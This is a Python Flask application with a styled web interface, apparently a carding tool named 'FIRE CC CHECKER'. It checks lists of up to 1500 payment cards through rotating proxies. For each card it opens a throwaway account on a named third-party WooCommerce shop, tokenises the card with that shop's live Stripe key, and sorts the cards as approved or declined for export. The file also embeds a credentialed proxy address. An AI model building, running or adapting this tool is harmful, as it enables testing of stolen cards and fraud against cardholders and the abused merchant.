from flask import Flask, render_template_string, request, jsonify, send_file
import asyncio
import httpx
import random
import string
import re
import json
import os
import threading
from datetime import datetime
from fake_useragent import UserAgent
from bs4 import BeautifulSoup
import base64
from io import StringIO
import csv

app = Flask(__name__)

# HTML Template with FIRE Design
HTML_TEMPLATE = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>⚡ FIRE CC CHECKER - Stripe </title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Space Grotesk', sans-serif;
        }

        body {
            background: linear-gradient(135deg, #0f0c1f 0%, #1a1b2f 100%);
            min-height: 100vh;
            color: #fff;
            position: relative;
            overflow-x: hidden;
        }

        body::before {
            content: '';
            position: fixed;
            width: 200%;
            height: 200%;
            background: radial-gradient(circle at 50% 50%, rgba(255, 70, 85, 0.1) 0%, transparent 50%);
            animation: pulse 15s ease-in-out infinite;
            z-index: -1;
        }

        @keyframes pulse {
            0%, 100% { transform: scale(1); opacity: 0.5; }
            50% { transform: scale(1.1); opacity: 0.8; }
        }

        .container {
            max-width: 1600px;
            margin: 0 auto;
            padding: 20px;
        }

        .header {
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 20px 0;
            border-bottom: 2px solid rgba(255, 70, 85, 0.3);
            margin-bottom: 30px;
        }

        .logo {
            display: flex;
            align-items: center;
            gap: 15px;
        }

        .logo-icon {
            font-size: 48px;
            color: #ff4655;
            filter: drop-shadow(0 0 20px rgba(255, 70, 85, 0.5));
            animation: glow 2s ease-in-out infinite;
        }

        @keyframes glow {
            0%, 100% { filter: drop-shadow(0 0 20px rgba(255, 70, 85, 0.5)); }
            50% { filter: drop-shadow(0 0 40px rgba(255, 70, 85, 0.8)); }
        }

        .logo-text h1 {
            font-size: 36px;
            font-weight: 700;
            background: linear-gradient(135deg, #fff 0%, #ff4655 100%);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            letter-spacing: 2px;
        }

        .logo-text p {
            color: #8a8fbf;
            font-size: 14px;
        }

        .stats {
            display: flex;
            gap: 20px;
        }

        .stat-card {
            background: rgba(255, 255, 255, 0.05);
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255, 70, 85, 0.2);
            border-radius: 15px;
            padding: 20px 30px;
            text-align: center;
            transition: 0.3s;
            position: relative;
            overflow: hidden;
        }

        .stat-card::before {
            content: '';
            position: absolute;
            top: -50%;
            left: -50%;
            width: 200%;
            height: 200%;
            background: radial-gradient(circle, rgba(255, 70, 85, 0.2) 0%, transparent 70%);
            opacity: 0;
            transition: 0.5s;
        }

        .stat-card:hover::before {
            opacity: 1;
        }

        .stat-card:hover {
            transform: translateY(-5px);
            border-color: #ff4655;
            box-shadow: 0 10px 30px rgba(255, 70, 85, 0.3);
        }

        .stat-value {
            font-size: 32px;
            font-weight: 700;
            color: #ff4655;
            margin-bottom: 5px;
        }

        .stat-label {
            color: #8a8fbf;
            font-size: 12px;
            text-transform: uppercase;
            letter-spacing: 1px;
        }

        .main-grid {
            display: grid;
            grid-template-columns: 1.2fr 0.8fr;
            gap: 25px;
            margin-bottom: 25px;
        }

        .card {
            background: rgba(20, 22, 45, 0.8);
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255, 70, 85, 0.2);
            border-radius: 25px;
            padding: 25px;
            transition: 0.3s;
        }

        .card:hover {
            border-color: #ff4655;
            box-shadow: 0 10px 40px rgba(255, 70, 85, 0.2);
        }

        .card-title {
            font-size: 18px;
            font-weight: 600;
            color: #fff;
            margin-bottom: 20px;
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .card-title i {
            color: #ff4655;
            font-size: 24px;
        }

        .input-group {
            margin-bottom: 20px;
        }

        .input-label {
            display: block;
            color: #8a8fbf;
            font-size: 14px;
            margin-bottom: 8px;
            font-weight: 500;
        }

        .input-field {
            width: 100%;
            background: rgba(0, 0, 0, 0.3);
            border: 2px solid rgba(255, 70, 85, 0.2);
            border-radius: 15px;
            padding: 15px;
            color: #fff;
            font-size: 14px;
            transition: 0.3s;
        }

        .input-field:focus {
            outline: none;
            border-color: #ff4655;
            box-shadow: 0 0 20px rgba(255, 70, 85, 0.3);
        }

        textarea.input-field {
            min-height: 200px;
            resize: vertical;
            font-family: 'Monaco', 'Menlo', monospace;
        }

        .proxy-item {
            background: rgba(255, 255, 255, 0.03);
            border: 1px solid rgba(255, 70, 85, 0.1);
            border-radius: 10px;
            padding: 10px;
            margin-bottom: 10px;
            display: flex;
            align-items: center;
            justify-content: space-between;
        }

        .proxy-ip {
            color: #fff;
            font-family: monospace;
        }

        .proxy-status {
            width: 10px;
            height: 10px;
            border-radius: 50%;
            background: #4caf50;
            box-shadow: 0 0 10px #4caf50;
        }

        .btn {
            background: linear-gradient(135deg, #ff4655 0%, #ff6b81 100%);
            border: none;
            border-radius: 15px;
            padding: 15px 30px;
            color: #fff;
            font-weight: 600;
            font-size: 16px;
            cursor: pointer;
            transition: 0.3s;
            display: inline-flex;
            align-items: center;
            gap: 10px;
            border: 2px solid transparent;
        }

        .btn:hover {
            transform: translateY(-3px);
            box-shadow: 0 10px 30px rgba(255, 70, 85, 0.5);
            border-color: #fff;
        }

        .btn-outline {
            background: transparent;
            border: 2px solid #ff4655;
            color: #ff4655;
        }

        .btn-outline:hover {
            background: #ff4655;
            color: #fff;
        }

        .results-container {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 25px;
            margin-top: 25px;
        }

        .results-box {
            background: rgba(20, 22, 45, 0.8);
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255, 70, 85, 0.2);
            border-radius: 25px;
            overflow: hidden;
        }

        .results-header {
            padding: 20px;
            background: rgba(255, 70, 85, 0.1);
            border-bottom: 2px solid #ff4655;
            display: flex;
            align-items: center;
            justify-content: space-between;
        }

        .results-header h3 {
            font-size: 18px;
            font-weight: 600;
            color: #fff;
        }

        .results-header i {
            color: #ff4655;
            font-size: 24px;
        }

        .results-content {
            padding: 20px;
            max-height: 500px;
            overflow-y: auto;
        }

        .result-item {
            background: rgba(0, 0, 0, 0.3);
            border: 1px solid rgba(255, 70, 85, 0.1);
            border-radius: 10px;
            padding: 12px;
            margin-bottom: 10px;
            font-family: monospace;
            font-size: 13px;
            transition: 0.3s;
        }

        .result-item.approved {
            border-left: 4px solid #4caf50;
            background: rgba(76, 175, 80, 0.1);
        }

        .result-item.declined {
            border-left: 4px solid #ff4655;
            background: rgba(255, 70, 85, 0.1);
        }

        .result-item.unknown {
            border-left: 4px solid #ffc107;
            background: rgba(255, 193, 7, 0.1);
        }

        .bin-info {
            display: inline-block;
            background: rgba(255, 70, 85, 0.2);
            border-radius: 5px;
            padding: 2px 8px;
            font-size: 11px;
            color: #ff4655;
            margin-left: 10px;
        }

        .action-buttons {
            display: flex;
            gap: 10px;
            margin-top: 20px;
        }

        .progress-bar {
            width: 100%;
            height: 4px;
            background: rgba(255, 70, 85, 0.2);
            border-radius: 2px;
            overflow: hidden;
            margin-top: 20px;
        }

        .progress-fill {
            height: 100%;
            background: linear-gradient(90deg, #ff4655, #ff8a9f);
            width: 0%;
            transition: width 0.3s;
        }

        .file-upload {
            border: 3px dashed rgba(255, 70, 85, 0.3);
            border-radius: 20px;
            padding: 30px;
            text-align: center;
            cursor: pointer;
            transition: 0.3s;
            margin-bottom: 20px;
        }

        .file-upload:hover {
            border-color: #ff4655;
            background: rgba(255, 70, 85, 0.05);
        }

        .file-upload i {
            font-size: 48px;
            color: #ff4655;
            margin-bottom: 10px;
        }

        .file-upload p {
            color: #8a8fbf;
        }

        ::-webkit-scrollbar {
            width: 8px;
        }

        ::-webkit-scrollbar-track {
            background: rgba(255, 70, 85, 0.1);
        }

        ::-webkit-scrollbar-thumb {
            background: #ff4655;
            border-radius: 4px;
        }

        ::-webkit-scrollbar-thumb:hover {
            background: #ff6b81;
        }

        @media (max-width: 1200px) {
            .main-grid {
                grid-template-columns: 1fr;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="logo">
                <div class="logo-icon">
                    <i class="fas fa-bolt"></i>
                </div>
                <div class="logo-text">
                    <h1>FIRE CC CHECKER</h1>
                    <p>Stripe Gateway Validator</p>
                </div>
            </div>
            <div class="stats">
                <div class="stat-card">
                    <div class="stat-value" id="approvedCount">0</div>
                    <div class="stat-label">Approved</div>
                </div>
                <div class="stat-card">
                    <div class="stat-value" id="declinedCount">0</div>
                    <div class="stat-label">Declined</div>
                </div>
                <div class="stat-card">
                    <div class="stat-value" id="totalCount">0</div>
                    <div class="stat-label">Total</div>
                </div>
            </div>
        </div>

        <div class="main-grid">
            <div class="card">
                <div class="card-title">
                    <i class="fas fa-plug"></i>
                    <span>Proxy Configuration</span>
                </div>
                <div class="input-group">
                    <label class="input-label">Proxy List (One per line - format: ip:port:user:pass)</label>
                    <textarea id="proxies" class="input-field" placeholder="192.168.1.1:8080:user:pass&#10;192.168.1.2:8080:user2:pass2">64.137.96.74:6641:qgwjsrkl:u2spwmfird4r</textarea>
                </div>
                <div class="proxy-item">
                    <span class="proxy-ip">Active Proxy: 64.137.96.74:6641</span>
                    <span class="proxy-status"></span>
                </div>
            </div>

            <div class="card">
                <div class="card-title">
                    <i class="fas fa-credit-card"></i>
                    <span>Cards Input</span>
                </div>
                <div class="file-upload" onclick="document.getElementById('fileInput').click()">
                    <i class="fas fa-cloud-upload-alt"></i>
                    <p>Click to upload file or drag & drop</p>
                    <p style="font-size:12px">.txt files only (max 1500 cards)</p>
                </div>
                <input type="file" id="fileInput" style="display:none" accept=".txt" onchange="handleFileUpload(this)">
                <div class="input-group">
                    <label class="input-label">Cards (cc|mm|yy|cvv) - Max 1500</label>
                    <textarea id="cards" class="input-field" placeholder="4539976740986157|08|28|256&#10;5425233430109903|12|25|123"></textarea>
                </div>
                <div class="action-buttons">
                    <button class="btn" onclick="startCheck()">
                        <i class="fas fa-play"></i> Start Checking
                    </button>
                    <button class="btn btn-outline" onclick="stopCheck()">
                        <i class="fas fa-stop"></i> Stop
                    </button>
                    <button class="btn btn-outline" onclick="clearAll()">
                        <i class="fas fa-trash"></i> Clear
                    </button>
                </div>
                <div class="progress-bar">
                    <div class="progress-fill" id="progress"></div>
                </div>
            </div>
        </div>

        <div class="results-container">
            <div class="results-box">
                <div class="results-header">
                    <h3><i class="fas fa-check-circle" style="color:#4caf50"></i> Approved Cards</h3>
                    <div>
                        <button class="btn-outline" style="padding:8px 15px" onclick="copyApproved()">
                            <i class="fas fa-copy"></i>
                        </button>
                        <button class="btn-outline" style="padding:8px 15px" onclick="downloadApproved()">
                            <i class="fas fa-download"></i>
                        </button>
                    </div>
                </div>
                <div class="results-content" id="approvedList"></div>
            </div>
            <div class="results-box">
                <div class="results-header">
                    <h3><i class="fas fa-times-circle" style="color:#ff4655"></i> Declined Cards</h3>
                    <div>
                        <button class="btn-outline" style="padding:8px 15px" onclick="copyDeclined()">
                            <i class="fas fa-copy"></i>
                        </button>
                        <button class="btn-outline" style="padding:8px 15px" onclick="downloadDeclined()">
                            <i class="fas fa-download"></i>
                        </button>
                    </div>
                </div>
                <div class="results-content" id="declinedList"></div>
            </div>
        </div>
    </div>

    <script>
        let checking = false;
        let approvedCards = [];
        let declinedCards = [];
        let currentIndex = 0;

        function handleFileUpload(input) {
            const file = input.files[0];
            if (!file) return;
            
            const reader = new FileReader();
            reader.onload = function(e) {
                document.getElementById('cards').value = e.target.result;
            };
            reader.readAsText(file);
        }

        async function checkCard(card, proxy) {
            const response = await fetch('/check', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({card: card, proxy: proxy})
            });
            return await response.json();
        }

        async function startCheck() {
            if (checking) return;
            
            const cardsText = document.getElementById('cards').value.trim();
            if (!cardsText) {
                alert('Please enter cards to check');
                return;
            }

            const proxiesText = document.getElementById('proxies').value.trim();
            const cards = cardsText.split('\\n').filter(c => c.trim());
            
            if (cards.length > 1500) {
                alert('Maximum 1500 cards allowed');
                return;
            }

            checking = true;
            approvedCards = [];
            declinedCards = [];
            currentIndex = 0;

            for (let i = 0; i < cards.length && checking; i++) {
                currentIndex = i + 1;
                document.getElementById('progress').style.width = 
                    (currentIndex / cards.length * 100) + '%';

                const result = await checkCard(cards[i], proxiesText);
                
                const binInfo = cards[i].split('|')[0].substring(0,6);
                const cardInfo = {
                    card: cards[i],
                    result: result.result,
                    bin: binInfo
                };

                if (result.result.includes('Approved')) {
                    approvedCards.push(cardInfo);
                    addToResults('approvedList', cardInfo, 'approved');
                } else {
                    declinedCards.push(cardInfo);
                    addToResults('declinedList', cardInfo, 'declined');
                }

                updateStats();
            }

            checking = false;
        }

        function addToResults(listId, cardInfo, type) {
            const list = document.getElementById(listId);
            const div = document.createElement('div');
            div.className = `result-item ${type}`;
            div.innerHTML = `
                ${cardInfo.card}<br>
                <span style="color:#8a8fbf;font-size:11px">
                    Result: ${cardInfo.result} 
                    <span class="bin-info">BIN: ${cardInfo.bin}</span>
                </span>
            `;
            list.appendChild(div);
            list.scrollTop = list.scrollHeight;
        }

        function updateStats() {
            document.getElementById('approvedCount').textContent = approvedCards.length;
            document.getElementById('declinedCount').textContent = declinedCards.length;
            document.getElementById('totalCount').textContent = 
                approvedCards.length + declinedCards.length;
        }

        function stopCheck() {
            checking = false;
        }

        function clearAll() {
            document.getElementById('cards').value = '';
            document.getElementById('approvedList').innerHTML = '';
            document.getElementById('declinedList').innerHTML = '';
            approvedCards = [];
            declinedCards = [];
            currentIndex = 0;
            updateStats();
            document.getElementById('progress').style.width = '0%';
        }

        function copyApproved() {
            const text = approvedCards.map(c => c.card).join('\\n');
            navigator.clipboard.writeText(text);
        }

        function copyDeclined() {
            const text = declinedCards.map(c => c.card + ' - ' + c.result).join('\\n');
            navigator.clipboard.writeText(text);
        }

        function downloadApproved() {
            const text = approvedCards.map(c => c.card + ' - ' + c.result + ' | BIN: ' + c.bin).join('\\n');
            const blob = new Blob([text], {type: 'text/plain'});
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = 'approved_cards.txt';
            a.click();
        }

        function downloadDeclined() {
            const text = declinedCards.map(c => c.card + ' - ' + c.result + ' | BIN: ' + c.bin).join('\\n');
            const blob = new Blob([text], {type: 'text/plain'});
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = 'declined_cards.txt';
            a.click();
        }
    </script>
</body>
</html>
'''

class WooStripeChecker:
    def __init__(self):
        self.client = None
        self.session_data = {}
    
    async def __aenter__(self):
        return self
    
    async def __aexit__(self, exc_type, exc_val, exc_tb):
        if self.client:
            await self.client.aclose()
    
    def set_proxy(self, proxy_string):
        try:
            if not proxy_string:
                self.client = httpx.AsyncClient(timeout=30, follow_redirects=True)
                return
                
            parts = proxy_string.split(':')
            if len(parts) == 4:
                ip, port, user, pw = parts
                proxy_url = f"http://{user}:{pw}@{ip}:{port}"
                self.client = httpx.AsyncClient(
                    proxies={"http://": proxy_url, "https://": proxy_url},
                    timeout=30,
                    follow_redirects=True
                )
            else:
                self.client = httpx.AsyncClient(timeout=30, follow_redirects=True)
        except:
            self.client = httpx.AsyncClient(timeout=30, follow_redirects=True)

    async def get_nonce(self, ho):
        try:
            r = await self.client.get(f'https://{ho}/my-account/')
            soup = BeautifulSoup(r.text, 'html.parser')
            nonce_input = soup.find('input', {'name': 'woocommerce-register-nonce'})
            return nonce_input.get('value') if nonce_input else None
        except:
            return None

    async def register(self, nonce, ho):
        user = ''.join(random.choices(string.ascii_lowercase, k=8))
        rand_num = random.randint(100, 999)
        username = f'Kha{user}{rand_num}'
        email = f'gen_{user}{rand_num}@gmail.com'
        password = f'Sifre{user}@#$%^!'
        
        data = {
            'username': username,
            'email': email,
            'password': password,
            'woocommerce-register-nonce': nonce,
            'register': 'Register',
            '_wp_http_referer': '/my-account/'
        }
        
        headers = {
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': f'https://{ho}',
            'Referer': f'https://{ho}/my-account/'
        }
        
        try:
            r = await self.client.post(
                f'https://{ho}/my-account/',
                data=data,
                headers=headers
            )
            
            if "Log out" in r.text or "logout" in r.text.lower():
                self.session_data['username'] = username
                self.session_data['email'] = email
                self.session_data['password'] = password
                return True
            return False
        except:
            return False

    async def get_ajax_nonce(self, ho):
        try:
            r = await self.client.get(f'https://{ho}/my-account/add-payment-method/')
            
            patterns = [
                r'"create_setup_intent_nonce":"([^"]+)"',
                r'"createAndConfirmSetupIntentNonce":"([^"]+)"',
                r'"createSetupIntentNonce":"([^"]+)"'
            ]
            
            for p in patterns:
                match = re.search(p, r.text)
                if match:
                    return match.group(1)
            return None
        except:
            return None

    async def get_stripe_token(self, cc, mm, yy, cvv):
        headers = {
            'origin': 'https://js.stripe.com',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Referer': 'https://js.stripe.com/',
        }
        
        if len(yy) == 2:
            yy = f'20{yy}'
        
        payload = f'type=card&card[number]={cc}&card[cvc]={cvv}&card[exp_year]={yy}&card[exp_month]={mm}&allow_redisplay=unspecified&billing_details[address][country]=TH&payment_user_agent=stripe.js%2Fc3ec434e35%3B+stripe-js-v3%2Fc3ec434e35%3B+payment-element%3B+deferred-intent&key=pk_live_PuSTzLYx1z0E6f7fk5b5KZRK00Jc2i4Ngr&_stripe_version=2024-06-20'
        
        try:
            r = await self.client.post(
                'https://api.stripe.com/v1/payment_methods',
                headers=headers,
                content=payload.encode('utf-8')
            )
            
            j = r.json()
            
            if 'id' in j:
                return j['id'], None
            
            err = j.get('error', {}).get('message', 'Token Error')
            return None, err
            
        except Exception as e:
            return None, str(e)

    async def check_card(self, payment_id, ajax_nonce, ho):
        data = {
            'action': 'wc_stripe_create_and_confirm_setup_intent',
            'wc-stripe-payment-method': payment_id,
            'wc-stripe-payment-type': 'card',
            '_ajax_nonce': ajax_nonce,
        }
        
        headers = {
            'Content-Type': 'application/x-www-form-urlencoded',
            'Referer': f'https://{ho}/my-account/add-payment-method/',
            'Origin': f'https://{ho}',
            'X-Requested-With': 'XMLHttpRequest'
        }

        try:
            r = await self.client.post(
                f'https://{ho}/wp-admin/admin-ajax.php',
                headers=headers,
                data=data
            )
            
            txt = r.text
            
            if re.search(r'succeeded', txt, re.I):
                return "Approved - Card is valid"
            elif re.search(r'declined', txt, re.I):
                return "Declined - Card declined"
            elif re.search(r'insufficient_funds', txt, re.I):
                return "Declined - Insufficient Funds"
            elif re.search(r'incorrect_cvc', txt, re.I):
                return "Declined - Incorrect CVC"
            elif re.search(r'expired_card', txt, re.I):
                return "Declined - Expired Card"
            elif re.search(r'requires_action', txt, re.I):
                return "3DS Required - Card needs authentication"
            elif re.search(r'stolen_card', txt, re.I):
                return "Declined - Stolen Card"
            elif re.search(r'lost_card', txt, re.I):
                return "Declined - Lost Card"
            else:
                return f"Unknown - Check failed"
                
        except:
            return "Error - Connection failed"

@app.route('/')
def home():
    return render_template_string(HTML_TEMPLATE)

@app.route('/check', methods=['POST'])
async def check():
    data = request.json
    card = data.get('card', '')
    proxy_string = data.get('proxy', '')
    ho = "girlslivingwell.com"
    
    try:
        cc_num, mm, yy, cvv = card.split('|')
        
        usr = UserAgent()
        headers = {
            'Connection': 'keep-alive',
            'User-Agent': usr.random,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
        }
        
        async with WooStripeChecker() as checker:
            checker.client = httpx.AsyncClient(
                headers=headers,
                timeout=30,
                follow_redirects=True
            )
            
            checker.set_proxy(proxy_string)
            
            nonce = await checker.get_nonce(ho)
            if not nonce:
                return jsonify({'result': 'Failed - Cannot get nonce'})
            
            reg = await checker.register(nonce, ho)
            if not reg:
                return jsonify({'result': 'Failed - Registration error'})
            
            ajax_nonce = await checker.get_ajax_nonce(ho)
            if not ajax_nonce:
                return jsonify({'result': 'Failed - Cannot get ajax nonce'})
            
            token, err = await checker.get_stripe_token(cc_num, mm, yy, cvv)
            if err:
                return jsonify({'result': f'Failed - {err}'})
            
            result = await checker.check_card(token, ajax_nonce, ho)
            
            return jsonify({'result': result})
        
    except Exception as e:
        return jsonify({'result': f'Error - {str(e)}'})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
